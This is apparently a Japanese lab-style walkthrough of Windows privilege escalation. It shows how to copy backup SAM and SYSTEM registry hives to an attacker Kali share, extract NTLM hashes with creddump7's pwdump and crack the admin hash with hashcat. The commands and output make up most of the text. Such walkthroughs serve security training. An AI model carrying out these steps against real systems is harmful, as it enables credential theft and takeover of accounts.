Windowsは、セキュリティアカウントマネージャ（SAM）にパスワードのハッシュを保存します。 ハッシュは、SYSTEMというファイルにあるキーで暗号化されています。 SAMとSYSTEMファイルを読む能力があれば、ハッシュを抽出することが可能です。
### SAM/SYSTEM Locations
SAMファイルとSYSTEMファイルは、C: \Windows\System32のconfigディレクトリに配置されています。   
Windowsの起動中は、ファイルがロックされます。   
C:\Windows\RepairまたはC:\Windows\System32\config\RegBackディレクトリにファイルのバックアップが存在する可能性があり ます。
# Privilege Escalation
1. SAMファイルやSYSTEMファイルのバックアップは、C:\Windows\Repairにあり、弊社ユーザーでも読むことができます。
2. ファイルをKaliにコピーして戻す。
```
> copy C:\Windows\Repair\SAM \\192.168.100.153\tools\
> copy C:\Windows\Repair\SYSTEM \\192.168.100.153\tools\
```
3. 最新版のcreddumpスイートをダウンロードします。
```
# git clone https://github.com/Neohapsis/creddump7.git
```
4. SAMとSYSTEMファイルに対してpwdumpツールを実行し、ハッシュを抽出します。
```
# /usr/share/creddump7/pwdump.py SYSTEM SAM 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:f27c0c12a5c94e851d73b4ce3a77d149:::
IEUser:1000:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
sshd:1002:aad3b435b51404eeaad3b435b51404ee:475a7dd05810c001c892853b88ba03a9:::
user:1003:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
admin:1004:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
```
5. hashcatを使用して管理者ユーザーのハッシュをクラックします。※passwordのhashは2個目のhash
```
# hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
```
